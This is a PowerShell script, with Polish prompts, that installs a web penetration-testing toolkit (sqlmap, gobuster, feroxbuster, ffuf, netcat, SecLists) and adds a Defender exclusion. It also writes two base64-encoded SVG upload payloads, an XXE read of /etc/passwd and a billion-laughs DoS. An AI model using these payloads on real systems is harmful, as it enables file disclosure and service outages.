#########################################################################################################################

clear
echo "************************************************************************"
echo ""
ls C:\Users
echo ""
echo ""
echo "________________________________________________________________________"
echo "*************************** Podaj nazwe ********************************"
echo "------------------------------------------------------------------------"
echo ""
$USERCONF = Read-Host "Nazwa usera do konfiguracji"

#########################################################################################################################

mkdir C:\Users\$USERCONF\Documents\WindowsPowerShell
'function sqlmap {
        python C:\tools\prog\sqlmap\sqlmap\sqlmap.py $args
}
function gobuster {
        C:\tools\prog\gobuster\gobuster.exe $args
}
function feroxbuster {
        C:\tools\prog\feroxbuster\feroxbuster.exe $args
}
function ffuf {
        C:\tools\prog\ffuf\ffuf.exe $args
}
function nc {
        C:\tools\prog\nc\nc64.exe $args
}' > C:\Users\$USERCONF\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

#########################################################################################################################

mkdir C:\tools
Add-MpPreference -ExclusionPath "C:\tools\"

mkdir C:\tools\wordlists
cd C:\tools\wordlists

git clone https://github.com/danielmiessler/SecLists.git

#########################################################################################################################

$folderPaths = @("C:\tools\wordlists\SecLists\Fuzzing", "C:\tools\wordlists\SecLists\Discovery")

$outputFile = "C:\tools\wordlists\webFullListEndpointsPayloads"

$uniqueLines = New-Object System.Collections.Generic.HashSet[string]

$files = $folderPaths | ForEach-Object { Get-ChildItem -Path $_ -Recurse -Filter "*.txt" }

$totalFiles = $files.Count
$currentFile = 0

foreach ($file in $files) {
    $currentFile++

    Write-Progress -PercentComplete (($currentFile / $totalFiles) * 100) `
                   -Activity "$currentFile z $totalFiles plikow" `
                   -CurrentOperation $file.FullName

    Get-Content $file.FullName | ForEach-Object {
        $uniqueLines.Add($_) | Out-Null
    }
}

$uniqueLines | Set-Content -Path $outputFile

#########################################################################################################################

cd C:\tools
mkdir prog
cd prog

mkdir gobuster
cd gobuster

iwr -uri 'https://github.com/OJ/gobuster/releases/download/v3.6.0/gobuster_Windows_x86_64.zip' -o gobuster.zip
Expand-Archive -Path gobuster.zip -DestinationPath . -Force

#########################################################################################################################

cd C:\tools\prog

mkdir feroxbuster
cd feroxbuster

iwr -uri 'https://github.com/epi052/feroxbuster/releases/download/v2.11.0/x86-windows-feroxbuster.exe.zip' -o feroxbuster.zip
Expand-Archive -Path feroxbuster.zip -DestinationPath . -Force

#########################################################################################################################

cd C:\tools\prog

mkdir ffuf
cd ffuf

iwr -uri 'https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_windows_386.zip' -o ffuf.zip
Expand-Archive -Path ffuf.zip -DestinationPath . -Force

#########################################################################################################################

cd C:\tools\prog

mkdir nc
cd nc

iwr -uri 'https://github.com/skyformat99/netcat-for-windows/raw/refs/heads/master/1.12/nc64.exe' -o nc64.exe

#########################################################################################################################

cd C:\tools\prog

mkdir sqlmap
cd sqlmap

git clone https://github.com/sqlmapproject/sqlmap.git

#########################################################################################################################

cd C:\tools
mkdir UploadFiles
cd UploadFiles

$tablica = @(
    @{nazwa_pliku="svg1.svg"; dane_base64="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHN2ZyBbIDwhRU5USVRZIHBheSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI+IF0+Cjxzdmc+JnBheTs8L3N2Zz4K"},
    @{nazwa_pliku="svg2_DoS.svg"; dane_base64="PCEtLT94bWwgdmVyc2lvbj0iMS4wIiA/LS0+CjwhRE9DVFlQRSBsb2x6IFs8IUVOVElUWSBsb2wgImxvbCI+PCFFTEVNRU5UIGxvbHogKCNQQ0RBVEEpPgogIDwhRU5USVRZIGxvbDEgIiZsb2w7JmxvbDsmbG9sOyZsb2w7JmxvbDsmbG9sOyZsb2w7Ij4KICA8IUVOVElUWSBsb2wyICImbG9sMTsmbG9sMTsmbG9sMTsmbG9sMTsmbG9sMTsmbG9sMTsmbG9sMTsiPgogIDwhRU5USVRZIGxvbDMgIiZsb2wyOyZsb2wyOyZsb2wyOyZsb2wyOyZsb2wyOyZsb2wyOyZsb2wyOyI+CiAgPCFFTlRJVFkgbG9sNCAiJmxvbDM7JmxvbDM7JmxvbDM7JmxvbDM7JmxvbDM7JmxvbDM7JmxvbDM7Ij4KICA8IUVOVElUWSBsb2w1ICImbG9sNDsmbG9sNDsmbG9sNDsmbG9sNDsmbG9sNDsmbG9sNDsmbG9sNDsiPgogIDwhRU5USVRZIGxvbDYgIiZsb2w1OyZsb2w1OyZsb2w1OyZsb2w1OyZsb2w1OyZsb2w1OyZsb2w1OyI+CiAgPCFFTlRJVFkgbG9sNyAiJmxvbDY7JmxvbDY7JmxvbDY7JmxvbDY7JmxvbDY7JmxvbDY7JmxvbDY7Ij4KICA8IUVOVElUWSBsb2w4ICImbG9sNzsmbG9sNzsmbG9sNzsmbG9sNzsmbG9sNzsmbG9sNzsmbG9sNzsiPgogIDwhRU5USVRZIGxvbDkgIiZsb2w4OyZsb2w4OyZsb2w4OyZsb2w4OyZsb2w4OyZsb2w4OyZsb2w4OyI+Cl0+Cjx0YWc+JmxvbDk7PC90YWc+Cg=="}
)



foreach ($element in $tablica) {
    $bajty = [System.Convert]::FromBase64String($element.dane_base64)
    [System.IO.File]::WriteAllBytes("C:\tools\UploadFiles\"+$element.nazwa_pliku, $bajty)
}

#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
#########################################################################################################################
